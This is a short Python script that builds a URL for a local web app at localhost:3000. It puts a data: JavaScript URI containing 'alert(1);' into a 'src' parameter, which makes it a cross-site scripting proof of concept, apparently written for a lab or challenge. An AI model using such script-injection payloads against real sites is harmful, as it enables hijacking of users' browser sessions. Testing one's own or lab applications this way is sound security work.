from urllib.parse import quote
from base64 import b64encode

base = "http://localhost:3000/"

name = "embed"
payload = "alert(1);"
src = f"data:text/javascript,{quote(payload)}"

url = f"{base}?name={quote(name)}&src={quote(src)}"

print(url)